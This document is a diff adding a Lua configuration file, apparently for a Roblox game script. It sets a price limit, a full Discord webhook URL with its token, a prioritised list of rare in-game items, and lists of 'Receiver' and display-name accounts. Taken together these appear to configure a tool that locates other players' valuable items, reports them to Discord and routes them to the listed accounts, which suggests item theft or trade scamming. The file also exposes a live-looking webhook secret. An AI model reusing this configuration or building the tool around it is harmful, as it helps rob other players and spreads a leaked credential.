@@ -1,0 +1,37 @@
+-- 🔗 Shared Config (by PhatLee)
+local config = {}
+
+config.PRICE_LIMIT = 10_000_000
+config.WEBHOOK = "https://discord.com/api/webhooks/1431942727897190452/oNJrMmw3nJ7J8m1NrX_R4cK3_dYwBFaVAeG8UtU6vq77YzYqyyJPL0PMWmG8Q2OfRnoD"
+
+config.targetNames = {
+    {name = "Strawberry Elephant", priority = 1},
+    {name = "Meowl", priority = 2},
+    {name = "Dragon Cannelloni", priority = 3},
+    {name = "Spooky and Pumky", priority = 4},
+    {name = "Spaghetti Tualetti", priority = 5},
+    {name = "La Secret Combinasion", priority = 6},
+    {name = "La Supreme Combinasion", priority = 7},
+    {name = "La Spooky Combinasion", priority = 8},
+    {name = "Ketupat Kepat", priority = 9},
+    {name = "Garama and Madundung", priority = 10},
+    {name = "Secret Lucky Block", priority = 11},
+    {name = "Ketchuru and Musturu", priority = 12},
+    {name = "Los Lucky Blocks", priority = 13},
+    {name = "Los Hotspotsitos", priority = 14},
+    {name = "Los Bros", priority = 15},
+    {name = "Los Nooo My Hotspotsitos", priority = 16},
+    {name = "Nooo My Hotspot", priority = 17},
+    {name = "Nuclearo Dinossauro", priority = 18},
+    {name = "La Grande Combinasion", priority = 19},
+    {name = "Los Combinasionas", priority = 20},
+    {name = "Tacorita Bicicleta", priority = 21},
+    {name = "Esok Sekolah", priority = 22},
+    {name = "Admin Lucky Block", priority = 23},
+    {name = "Taco Lucky Block", priority = 24},
+    {name = "67", priority = 25},
+}
+
+config.Displayname = { "Sweet", "phatle8117", "A", "B", " banpetuytin11115", "banpetuytin111140", "banpetuytin111150", "banpetuytin1111", "ConCuTiHon02", "banpetuytin11114", "banpetuytin11115", "phatle912", "phatle1001", "phatle2901", "phatle1111", "phattuan1", "phattuan2", "phattuan3", "lephat2901", "lephat1111", "lephat1509", "lephat9191", "yeubeminhthuy2901", "conbomaunau2901", "dangngocphubeophi", "conbomaudohihi123" }
+config.Receiver = { "phatle8117", "ConCuTiHon02", "candyblossom1243", "bomaylatip", "banpetuytin1111", "banpetuytin11114", "banpetuytin11115", "banpetuytin111140", "phatle912", "banpetuytin111150", "phatle1001", "phatle2901", "phatle1111", "phattuan1", "phattuan2", "phattuan3", "lephat2901", "lephat1111", "lephat1509", "lephat9191", "yeubeminhthuy2901", "conbomaunau2901", "dangngocphubeophi", "conbomaudohihi123" }
+return config
